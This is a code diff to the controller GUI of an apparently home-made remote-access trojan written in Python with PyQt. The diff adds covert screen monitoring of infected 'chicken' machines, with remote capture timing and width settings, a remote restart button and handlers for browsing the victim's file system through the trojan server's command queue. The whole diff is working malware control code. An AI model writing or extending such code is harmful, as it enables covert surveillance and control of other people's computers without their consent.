@@ -38,6 +38,8 @@ class DetailMain(QWidget, Ui_Form):
         self.online_label.setText("在线"if self.chicken.online else "离线")
         self.recvThread = None
         self.socket = None
+        self.flushtime.setText(str(5))
+        self.screenwidth = 700
         self.bind()
 
     def waitConnection(self):
@@ -59,7 +61,15 @@ class DetailMain(QWidget, Ui_Form):
         self.trojanServer.cmdQ.put("msg %d ls"%self.ck)
 
     def displayPic(self, qmp:QPixmap):
+        size = qmp.size()
+        qmp = qmp.scaled(self.screenwidth, int(size.height()*( self.screenwidth / size.width())))
         self.pic_label.setPixmap(qmp)
+
+    def localWidthChange(self):
+        self.screenwidth = self.localwidth.value()
+
+    def remoteWidthChange(self):
+        self.trojanServer.cmdQ.put("msg %d set picwidth %d" % (self.ck, self.remotewidth.value()))
 
     def tcpPieceRecv(self,length, socket, size=1024):
         dsize = 0
@@ -72,13 +82,14 @@ class DetailMain(QWidget, Ui_Form):
         return body
 
     def receive(self):
-        try:
-            while self.enableReiceive:
+        while self.enableReiceive:
+            try:
                 len_struct = self.socket.recv(4)
                 if len_struct:
                     lens = struct.unpack('i', len_struct)[0]
                     body = self.socket.recv(lens)
                     ty = body.decode('utf8')
+                    print("000")
                     if ty == "pic":
                         print("ds")
                         d = self.socket.recv(12)
@@ -102,23 +113,19 @@ class DetailMain(QWidget, Ui_Form):
                         self.consoleSignal.emit(response.decode("utf8"))
                     elif ty == "filelist":
                         res_len = struct.unpack('i', self.socket.recv(4))[0]
-                        # response = self.socket.recv(res_len)
                         response = self.tcpPieceRecv(res_len, self.socket, 1024)
                         data = json.loads(response.decode('utf8'))
                         data['list'] = data['list'][:300]
-                        STD(data)
-
                         self.listSignal.emit(data['list'])
                         self.pwdSignal.emit(data['pwd'])
-        except:
-            pass
+            except:
+                pass
         print("线程退出成功")
 
 
     def disconnected(self):
         self.enableReiceive = False
         self.trojanServer.cmdQ.put("msg %d disconnect" % self.ck)
-        STD("123")
         if self.socket:
             self.socket.close()
         self.infostatus.setText("未连接")
@@ -208,6 +215,17 @@ class DetailMain(QWidget, Ui_Form):
         if widget.isDir:
             self.trojanServer.cmdQ.put("msg %d dos cd %s" %(self.ck, name))
 
+    def picWatch(self):
+        status = self.startpic.text()
+        if status == "开启屏幕监控":
+            self.startpic.setText("关闭屏幕监控")
+            limit = self.flushtime.text()
+            self.trojanServer.cmdQ.put("msg %d set pictime %s" %(self.ck, limit))
+            self.trojanServer.cmdQ.put("msg %d picstart" % self.ck)
+        else:
+            self.startpic.setText("开启屏幕监控")
+            self.trojanServer.cmdQ.put("msg %d picstop" % self.ck)
+
     def bind(self):
         self.connect_button.clicked.connect(self.connectChicken)
         self.connectsignal.connect(self.connected)
@@ -221,6 +239,10 @@ class DetailMain(QWidget, Ui_Form):
         self.backbutton.clicked.connect(lambda: self.trojanServer.cmdQ.put("msg %d dos cd .." % self.ck))
         self.hombutton.clicked.connect(lambda: self.trojanServer.cmdQ.put("msg %d dos cd c:/" % self.ck))
         self.pwdSignal.connect(lambda x:self.address.setText(x))
+        self.startpic.clicked.connect(self.picWatch)
+        self.remotewidth.valueChanged.connect(self.remoteWidthChange)
+        self.localwidth.valueChanged.connect(self.localWidthChange)
+        self.restartbutton.clicked.connect(lambda: self.trojanServer.cmdQ.put("msg %d dos restart" % self.ck))
 
 
 if __name__ == '__main__':
